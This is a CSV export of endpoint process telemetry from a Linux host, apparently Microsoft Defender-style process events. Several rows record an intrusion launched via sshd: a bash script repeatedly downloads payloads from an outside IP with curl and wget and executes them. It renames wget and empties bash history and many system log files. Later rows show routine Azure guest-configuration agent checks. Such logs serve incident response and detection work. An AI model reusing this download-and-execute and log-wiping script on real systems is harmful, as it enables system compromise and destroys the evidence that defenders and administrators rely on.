"TimeGenerated [UTC]",DeviceName,FileName,SHA256,FolderPath,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessParentFileName,ProcessCommandLine,InitiatingProcessSHA256
"4/5/2025, 4:23:59.492 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",sshd,"bash -c 'wdir=""/bin""
for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://172.82.91.106/p.txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://172.82.91.106/p.txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://172.82.91.106/p.txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://172.82.91.106/2.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://172.82.91.106/2.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://172.82.91.106/2.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?


'",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.495 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",sshd,"bash -c 'wdir=""/bin""
for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://172.82.91.106/p.txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://172.82.91.106/p.txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://172.82.91.106/p.txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://172.82.91.106/2.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://172.82.91.106/2.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://172.82.91.106/2.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?


'",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.496 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",sshd,"bash -c 'wdir=""/bin""
for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://172.82.91.106/p.txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://172.82.91.106/p.txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://172.82.91.106/p.txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://172.82.91.106/2.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://172.82.91.106/2.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://172.82.91.106/2.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?


'",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.499 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",sshd,"bash -c 'wdir=""/bin""
for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://172.82.91.106/p.txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://172.82.91.106/p.txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://172.82.91.106/p.txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://172.82.91.106/2.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://172.82.91.106/2.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://172.82.91.106/2.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?


'",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.499 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",curl,a840b283b477e60986aa576b3eb5aff7a9864787dfc6401961d155cba63ce9d2,"/usr/bin/curl",bash,"/usr/bin/bash",bash,"curl http://172.82.91.106/2.txt -o sdf3fslsdf15",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.683 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",sshd,"bash -c 'wdir=""/bin""
for i in ""/bin"" ""/home"" ""/root"" ""/tmp"" ""/usr"" ""/etc""
do
if [ -w $i ]
then
wdir=$i
break
fi
done
cd $wdir
curl http://172.82.91.106/p.txt -o ygljglkjgfg0
chmod +x ygljglkjgfg0
./ygljglkjgfg0
wget http://172.82.91.106/p.txt -O ygljglkjgfg1
chmod +x ygljglkjgfg1
./ygljglkjgfg1
good http://172.82.91.106/p.txt -O ygljglkjgfg2
chmod +x ygljglkjgfg2
./ygljglkjgfg2
sleep 2
wget http://172.82.91.106/2.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13
good http://172.82.91.106/2.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14
curl http://172.82.91.106/2.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15
sleep 2
mv /usr/bin/wget /usr/bin/good
mv /bin/wget /bin/good
cat /dev/null >/root/.bash_history
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/log/lastlog
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/boot.log
cat /dev/null > /var/log/cron
cat /dev/null > /var/log/dmesg
cat /dev/null > /var/log/firewalld
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/messages
cat /dev/null > /var/log/spooler
cat /dev/null > /var/log/syslog
cat /dev/null > /var/log/tallylog
cat /dev/null > /var/log/yum.log
cat /dev/null >/root/.bash_history
ls -la /etc/daemon.cfg
exit $?


'",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.684 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",chmod,,,bash,"/usr/bin/bash",bash,,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:23:59.687 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",sleep,b9aec374a2b2a175a182f615291ad408820b7fb8c663a184e37fa3492d3f8eff,"/usr/bin/sleep",bash,"/usr/bin/bash",bash,"sleep 2",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:24:01.689 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",mv,8e2b0545d39a38c2167949bafa943a9d848f363ded3782a9c350fe5e1a66d82c,"/usr/bin/mv",bash,"/usr/bin/bash",bash,"mv /usr/bin/wget /usr/bin/good",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:24:01.699 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",cat,210ffa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba,"/usr/bin/cat",bash,"/usr/bin/bash",bash,"cat /dev/null",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.283 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash","gc_worker","sh -c ""sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh 2>&1 2>&1""",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:48:35.284 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:48:35.284 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:48:35.285 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",dash,"/usr/bin/dash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:48:35.287 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.288 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",cat,210ffa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba,"/usr/bin/cat",bash,"/usr/bin/bash",bash,"cat /proc/version",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.290 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.381 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",bash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.383 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",bash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.383 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",head,9e457645cdcfd74ee0a9688b25b7b017d8d393233a0c0bdf3bef3c57a1238ce2,"/usr/bin/head",bash,"/usr/bin/bash",bash,"head -n1",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:48:35.384 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",sort,0fc26ce295e8e549635da2129e389f63685745b3be7c1737db6251a296f1cd78,"/usr/bin/sort",bash,"/usr/bin/bash",bash,"sort -V",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.381 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash","gc_worker","sh -c ""sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh 2>&1 2>&1""",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:49:32.382 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:49:32.382 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:49:32.383 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",dash,"/usr/bin/dash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:49:32.384 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.386 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",cat,210ffa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba,"/usr/bin/cat",bash,"/usr/bin/bash",bash,"cat /proc/version",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.387 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.388 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",bash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.388 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",bash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.389 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",sort,,,bash,"/usr/bin/bash",bash,,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.481 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",bash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:49:32.481 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",,,,bash,"/usr/bin/bash",bash,,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:50:42.182 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash","gc_worker","sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:50:42.183 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",dash,"/usr/bin/dash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:50:42.185 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",bash,"/usr/bin/bash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:50:42.186 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",cat,210ffa7daedb3ef6e9230d391e9a10043699ba81080ebf40c6de70ed77e278ba,"/usr/bin/cat",bash,"/usr/bin/bash",bash,"cat /proc/version",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:50:42.189 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",sort,0fc26ce295e8e549635da2129e389f63685745b3be7c1737db6251a296f1cd78,"/usr/bin/sort",bash,"/usr/bin/bash",bash,"sort -V",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:50:42.190 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",head,9e457645cdcfd74ee0a9688b25b7b017d8d393233a0c0bdf3bef3c57a1238ce2,"/usr/bin/head",bash,"/usr/bin/bash",bash,"head -n1",59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4
"4/5/2025, 4:51:44.987 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash","gc_worker","sh -c ""sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh 2>&1 2>&1""",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:51:45.081 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:51:45.081 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",dash,4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483,"/usr/bin/dash",dash,"/usr/bin/dash",dash,"sh -c /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
"4/5/2025, 4:51:45.082 PM","linux-vulnscan-allen.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net",bash,59474588a312b6b6e73e5a42a59bf71e62b55416b6c9d5e4a6e1c630c2a9ecd4,"/usr/bin/bash",dash,"/usr/bin/dash",dash,"/bin/bash /var/lib/waagent/Microsoft.GuestConfiguration.ConfigurationforLinux-1.26.85/GCAgent/GC/../GC/powershell_check_supported_os.sh",4f291296e89b784cd35479fca606f228126e3641f5bcaee68dee36583d7c9483
